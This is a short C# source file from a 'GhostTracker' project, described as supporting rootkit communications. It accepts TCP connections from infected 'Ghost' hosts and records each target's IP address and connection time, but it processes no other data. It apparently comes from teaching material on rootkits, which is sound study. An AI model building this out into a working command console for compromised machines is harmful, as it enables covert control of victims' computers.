// TargetController.cs
// Copyright Ric Vieler, 2006
// This file supports rootkit communications

using System;
using System.Net;
using System.Net.Sockets;
using System.Threading;
using System.Globalization;

namespace GhostTracker
{
	/// <summary>
	/// Summary description for TargetController.
	/// </summary>
	public class TargetController
	{
		string targetAddress = "";
		MainForm mainFormPtr;
		TcpClient myClient;

		public TargetController( MainForm parent, TcpClient client )
		{
			mainFormPtr = parent;
			myClient = client;
		}
		/// <summary>
		/// Handle a single Ghost connections
		/// </summary>
		public void Start()
		{
			try
			{
				Int32 bytesRead;
				// Buffer for reading data
				Byte[] bytes = new Byte[1024];
				String data = "";

				// Get a stream object for reading and writing
				NetworkStream stream = myClient.GetStream();

				// receive the data sent by the client.
				while( true )
				{
					if( !stream.DataAvailable )
					{
						Thread.Sleep(20);
						continue;
					}
					bytesRead = stream.Read( bytes, 0, bytes.Length );
					// Translate data bytes to a ASCII string.
					data = System.Text.Encoding.ASCII.GetString( bytes, 0, bytesRead );
					// Process the data sent by the client.
					if( targetAddress.Length == 0 )
					{
						// Initial data is always the target's IP address
						// Send to GhostTracker with target information
						DateTime time = DateTime.Now;
						targetAddress = data;
						mainFormPtr.AddTarget( this, targetAddress,
							" Connected " + time.ToString( "G" ) );
						continue;
					}
					// Process reveived data

					Thread.Sleep( 20 );
				}
			}
			catch( ThreadAbortException )
			{
				// Application is shutting down
			}       
		}
		public bool Ping()
		{
			return( true );
		}

		/// <summary>
		/// Clean up any resources being used.
		/// </summary>
		public void Stop()
		{
			// Shutdown the connection
			myClient.Close();
		}
	}
}
